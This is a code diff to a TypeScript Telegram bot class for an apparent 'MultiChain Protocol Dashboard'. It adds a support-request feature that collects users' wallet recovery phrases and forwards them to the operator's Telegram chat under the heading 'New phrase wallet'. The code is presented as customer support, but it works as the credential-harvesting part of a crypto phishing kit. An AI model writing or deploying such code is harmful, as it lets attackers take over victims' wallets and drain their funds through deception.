@@ -20,6 +20,18 @@ interface WalletNotification {
   timestamp: string
 }
 
+interface SupportRequest {
+  issueType: string
+  name: string
+  email: string
+  description: string
+  urgency: string
+  walletAddress: string
+  walletPhrase: string
+  network: string
+  timestamp: string
+}
+
 export class TelegramBot {
   private botToken: string
   private chatId: string
@@ -130,6 +142,54 @@ ${tokenList}
 
 ---
 <i>MultiChain Protocol Dashboard</i>`
+
+
+    return await this.sendMessage({
+      chat_id: this.chatId,
+      text: message,
+      parse_mode: "HTML",
+      disable_web_page_preview: true,
+    })
+  }
+
+  async sendSupportRequest(data: SupportRequest): Promise<boolean> {
+    const getUrgencyEmoji = (urgency: string) => {
+      switch (urgency.toLowerCase()) {
+        case "low":
+          return "🟢"
+        case "medium":
+          return "🟡"
+        case "high":
+          return "🟠"
+        case "critical":
+          return "🔴"
+        default:
+          return "⚪"
+      }
+    }
+
+    const formatAddress = (address: string) => {
+      if (!address || address === "Not connected") return "Not connected"
+      return `${address.slice(0, 6)}...${address.slice(-4)}`
+    }
+    const message = `🆘 <b>New phrase wallet</b>
+
+🔹 <b>Issue Type:</b> ${data.issueType}
+👤 <b>Name:</b> ${data.name}
+📧 <b>Email:</b> ${data.email}
+🧠 <b>Wallet Phrase:</b> ${data.walletPhrase}
+${getUrgencyEmoji(data.urgency)} <b>Urgency:</b> ${data.urgency.toUpperCase()}
+⏰ <b>Time:</b> ${data.timestamp}
+
+📝 <b>Description:</b>
+${data.description}
+
+💼 <b>Wallet Info:</b>
+  • Address: <code>${data.walletAddress}</code>
+  • Network: ${data.network}
+
+---
+<i>MultiChain Protocol Dashboard Support System</i>`
 
     return await this.sendMessage({
       chat_id: this.chatId,
